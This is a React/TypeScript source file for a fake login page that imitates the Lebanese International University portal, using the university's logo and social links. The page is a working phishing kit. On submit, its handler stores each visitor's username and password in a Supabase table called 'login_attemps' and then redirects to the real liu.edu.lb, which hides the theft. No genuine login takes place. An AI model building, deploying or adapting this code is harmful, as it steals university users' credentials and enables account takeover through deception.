import { useState, type SubmitEvent } from 'react';

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faFacebookF } from '@fortawesome/free-brands-svg-icons';
import { faXTwitter } from '@fortawesome/free-brands-svg-icons';
import { faTiktok } from '@fortawesome/free-brands-svg-icons';
import { faYoutube } from '@fortawesome/free-brands-svg-icons';
import { faInstagram } from '@fortawesome/free-brands-svg-icons';
import { faLinkedin } from '@fortawesome/free-brands-svg-icons';

import { supabase } from './supabaseClient.ts'

import "./styles/login.css";

function Login() {

  const [id, setId] = useState('');
  const [pass, setPass] = useState('');

  async function handlePress(e: SubmitEvent<HTMLFormElement>){
    e.preventDefault();
    
    const newId = id.trim();
    const newPass = pass.trim();

    const { error } = await supabase
      .from('login_attemps') // I can't BELIEVE I made a typo creating the table on the database.
      .insert({
        u_id: newId,
        u_pass: newPass
      })

    if (!error) {
      window.location.href = "https://liu.edu.lb";
    }
  }

  return (
    <>
      <header id="header">
        <div className="header-news-top" ></div>
      </header>
      <div style={{height : "250px"}}></div>
      <div className="form-container">
            <div className="login-banner">
                <img src="https://syslbv4.liu.edu.lb/common/assets/login/img/Logo-Text.png" alt="LIU Login Banner" />
            </div>
        <form  name="myForm" className="form" onSubmit={handlePress}>
          <div className="input-group">
            <label htmlFor="USER">Username</label>
            <input type="text" name="USER" id="USER" placeholder="" autoComplete="off" required value={id} onChange={e => setId(e.target.value)}/>
          </div>
          <div className="input-group">
            <label htmlFor="PASS">Password</label>
            <input type="password" name="PASS" id="PASS" placeholder="" autoComplete="off" required value={pass} onChange={e => setPass(e.target.value)}/>
            <div className="forgot">
              <a id="resetA" href="#">Forgot Password?</a>
            </div>
          </div>
          <button type='submit' className="sign">LOGIN</button>
        </form>
        <div className="social-message">
          <div className="line"></div>
          <p className="message">Follow us</p>
          <div className="line"></div>
        </div>
        <div className="social-icons">
          <a href="https://www.facebook.com/lebintuni/" style={{color: "#2b5893"}}><FontAwesomeIcon icon={faFacebookF} /></a>

          <a href="https://twitter.com/LebIntUni" style={{color: "#1ea8d4"}}><FontAwesomeIcon icon={faXTwitter} /></a>

          <a href="https://www.tiktok.com/@lebaneseinternationaluni" style={{color: "#fff"}}><FontAwesomeIcon icon={faTiktok} /></a>

          <a href="https://liu.edu.lb/LIU/"><img src="https://syslbv4.liu.edu.lb/common/assets//login/img/LIU-Logo-YB.png" alt="LIU" width="60px" height="auto" /></a>

          <a href="http://www.youtube.com/LebIntUni" style={{color: "#de0f0f"}}><FontAwesomeIcon icon={faYoutube} /></a>

          <a href="https://www.instagram.com/lebintuni/" style={{color: "#e1306c"}}><FontAwesomeIcon icon={faInstagram} /></a>

          <a href="http://www.linkedin.com/company/499548?trk=pro_other_cmpy" style={{color: "#0a66c2"}}><FontAwesomeIcon icon={faLinkedin} /></a>
        </div>
        </div>
      <div style={{height : "50px"}}></div>
    </>
  );
}

export default Login;
